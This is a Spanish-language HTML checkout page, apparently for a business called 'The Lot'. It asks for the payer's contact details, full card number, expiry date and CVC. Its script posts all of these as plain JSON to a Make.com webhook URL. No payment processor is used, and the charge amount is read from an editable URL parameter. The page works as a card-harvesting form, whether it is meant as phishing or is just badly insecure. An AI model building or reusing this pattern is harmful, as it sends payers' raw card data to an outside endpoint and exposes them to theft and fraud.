<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pago - The Lot</title>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    body {
      font-family: 'Helvetica Neue', Helvetica, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #003A7E;
    }
    .container {
      background: #fff;
      padding: 2rem;
      border-radius: 16px;
      box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
      position: relative;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
    }
    label {
      font-weight: bold;
    }
    input, .readonly-input {
      padding: 1rem;
      font-size: 1rem;
      border: 2px solid #003A7E;
      border-radius: 12px;
    }
    .readonly-input {
      background-color: #f0f0f0;
      cursor: not-allowed;
    }
    button {
      background-color: #003A7E;
      color: white;
      border: none;
      padding: 1rem;
      font-size: 1.2rem;
      border-radius: 12px;
      cursor: pointer;
      transition: background-color .3s;
    }
    button:hover {
      background-color: #3D93F7;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Detalles de Pago</h1>
  <form id="pagoForm">
    <!-- Solo lectura: monto decidido -->
    <label for="payment_amount">Monto a pagar</label>
    <input type="text" id="payment_amount" class="readonly-input" readonly>

    <!-- Cliente ingresa estos datos -->
    <label for="customer_name">Nombre</label>
    <input type="text" id="customer_name" placeholder="Tu nombre completo" required>

    <label for="customer_phone">Teléfono</label>
    <input type="tel" id="customer_phone" placeholder="Tu teléfono" required>

    <label for="customer_email">Correo electrónico</label>
    <input type="email" id="customer_email" placeholder="Tu correo" required>

    <!-- Datos de tarjeta -->
    <label for="card_name">Nombre en tarjeta</label>
    <input type="text" id="card_name" placeholder="Nombre en tarjeta" required>

    <label for="card_number">Número de tarjeta</label>
    <input type="text" id="card_number" placeholder="Número de tarjeta" required maxlength="16">

    <label for="card_expiry">Vencimiento (MM/AA)</label>
    <input type="text" id="card_expiry" placeholder="MM/AA" required maxlength="5">

    <label for="card_cvc">CVC</label>
    <input type="text" id="card_cvc" placeholder="CVC" required maxlength="4">
    
    <!-- reCAPTCHA -->
    <div class="g-recaptcha" data-sitekey="6LfEvCcrAAAAAD0pDf2NlUYxazGY_iAZDwPPmGQ8"></div>

    <button type="submit">Pagar</button>
  </form>
</div>

<script>
  // Recuperar y mostrar el monto decidido
  const params = new URLSearchParams(window.location.search);
  const paymentValue = params.get('amount') || '0';
  document.getElementById('payment_amount').value = paymentValue;

  document.getElementById('pagoForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    // reCAPTCHA
    const recaptchaResponse = grecaptcha.getResponse();
    if (!recaptchaResponse) {
      alert('Por favor completa el reCAPTCHA.');
      return;
    }

    // Capturar inputs
    const data = {
      PaymentValueCents: parseInt(paymentValue, 10),
      customer_name:  document.getElementById('customer_name').value,
      customer_phone: document.getElementById('customer_phone').value,
      customer_email: document.getElementById('customer_email').value,
      card_name:      document.getElementById('card_name').value,
      card_number:    document.getElementById('card_number').value,
      card_expiry:    document.getElementById('card_expiry').value,
      card_cvc:       document.getElementById('card_cvc').value,
      "g-recaptcha-response": recaptchaResponse
    };

    try {
      await fetch('https://hook.us2.make.com/vx3ikx69t3uh4fd3n8s05ixj9hn8losu', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      window.location.href = 'gracias.html';
    } catch (err) {
      console.error(err);
      alert('Ocurrió un error al procesar tu pago. Intenta nuevamente.');
    }
  });
</script>

</body>
</html>
